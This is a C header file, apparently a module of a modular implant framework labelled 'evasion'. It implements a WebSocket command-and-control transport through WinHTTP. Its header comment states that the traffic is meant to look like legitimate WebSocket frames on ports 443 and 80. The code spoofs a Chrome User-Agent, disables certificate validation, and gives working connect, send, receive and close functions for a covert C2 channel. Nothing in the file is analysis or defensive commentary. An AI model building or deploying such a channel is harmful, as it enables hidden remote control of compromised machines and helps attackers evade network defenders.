// chunk: evasion/net_websocket
// depends: (none)
// provides: ws_connect, ws_send, ws_recv, ws_close
// headers: windows.h,winhttp.h
// libs: winhttp
// risk: medium
// note: WebSocket C2 transport — performs HTTP Upgrade to establish a persistent
//       WebSocket connection for bidirectional C2 communication. Traffic appears
//       as legitimate WebSocket frames on port 443/80. Uses WinHTTP WebSocket
//       APIs available since Windows 8.

#ifndef CHUNK_NET_WEBSOCKET
#define CHUNK_NET_WEBSOCKET

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

typedef struct {
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;
    HINTERNET hWebSocket;
} ws_ctx_t;

/* Establish a WebSocket connection.
 * host — target hostname (e.g. "ws.example.com")
 * port — port number (443 for wss://, 80 for ws://)
 * path — WebSocket endpoint path (e.g. "/ws/agent")
 * use_tls — nonzero for wss:// (HTTPS upgrade)
 * Returns opaque handle (ws_ctx_t*) or NULL on failure. */
static HANDLE ws_connect(const char *host, int port, const char *path,
                          int use_tls) {
    ws_ctx_t *ctx = (ws_ctx_t *)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY, sizeof(*ctx));
    if (!ctx) return NULL;

    WCHAR wHost[256] = {0};
    WCHAR wPath[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, host, -1, wHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, 512);

    ctx->hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/120.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ctx->hSession) goto fail;

    ctx->hConnect = WinHttpConnect(ctx->hSession, wHost,
                                    (INTERNET_PORT)port, 0);
    if (!ctx->hConnect) goto fail;

    DWORD reqFlags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    ctx->hRequest = WinHttpOpenRequest(ctx->hConnect, L"GET", wPath,
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        reqFlags);
    if (!ctx->hRequest) goto fail;

    if (use_tls) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(ctx->hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
    }

    /* Request WebSocket upgrade */
    if (!WinHttpSetOption(ctx->hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
                          NULL, 0))
        goto fail;

    if (!WinHttpSendRequest(ctx->hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            NULL, 0, 0, 0))
        goto fail;

    if (!WinHttpReceiveResponse(ctx->hRequest, NULL))
        goto fail;

    /* Complete the WebSocket handshake */
    ctx->hWebSocket = WinHttpWebSocketCompleteUpgrade(ctx->hRequest, 0);
    if (!ctx->hWebSocket) goto fail;

    /* The HTTP request handle is no longer needed after upgrade */
    WinHttpCloseHandle(ctx->hRequest);
    ctx->hRequest = NULL;

    return (HANDLE)ctx;

fail:
    if (ctx->hRequest)  WinHttpCloseHandle(ctx->hRequest);
    if (ctx->hConnect)  WinHttpCloseHandle(ctx->hConnect);
    if (ctx->hSession)  WinHttpCloseHandle(ctx->hSession);
    HeapFree(GetProcessHeap(), 0, ctx);
    return NULL;
}

/* Send binary data over the WebSocket.
 * Returns 0 on success, -1 on error. */
static int ws_send(HANDLE ws, const BYTE *data, DWORD len) {
    ws_ctx_t *ctx = (ws_ctx_t *)ws;
    if (!ctx || !ctx->hWebSocket) return -1;

    DWORD err = WinHttpWebSocketSend(ctx->hWebSocket,
                                      WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
                                      (PVOID)data, len);
    return (err == ERROR_SUCCESS) ? 0 : -1;
}

/* Receive data from the WebSocket.
 * buf/buf_len — output buffer
 * received — bytes actually read
 * Returns 0 on success, -1 on error, 1 on connection close. */
static int ws_recv(HANDLE ws, BYTE *buf, DWORD buf_len, DWORD *received) {
    ws_ctx_t *ctx = (ws_ctx_t *)ws;
    if (!ctx || !ctx->hWebSocket) return -1;

    WINHTTP_WEB_SOCKET_BUFFER_TYPE bufType;
    DWORD bytesRead = 0;
    DWORD err = WinHttpWebSocketReceive(ctx->hWebSocket, buf, buf_len,
                                         &bytesRead, &bufType);
    if (err != ERROR_SUCCESS) return -1;

    if (bufType == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE)
        return 1;

    if (received) *received = bytesRead;
    return 0;
}

/* Close the WebSocket connection and free resources. */
static void ws_close(HANDLE ws) {
    ws_ctx_t *ctx = (ws_ctx_t *)ws;
    if (!ctx) return;

    if (ctx->hWebSocket) {
        WinHttpWebSocketClose(ctx->hWebSocket,
                               WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
                               NULL, 0);
        WinHttpCloseHandle(ctx->hWebSocket);
    }
    if (ctx->hRequest)  WinHttpCloseHandle(ctx->hRequest);
    if (ctx->hConnect)  WinHttpCloseHandle(ctx->hConnect);
    if (ctx->hSession)  WinHttpCloseHandle(ctx->hSession);
    HeapFree(GetProcessHeap(), 0, ctx);
}

#endif
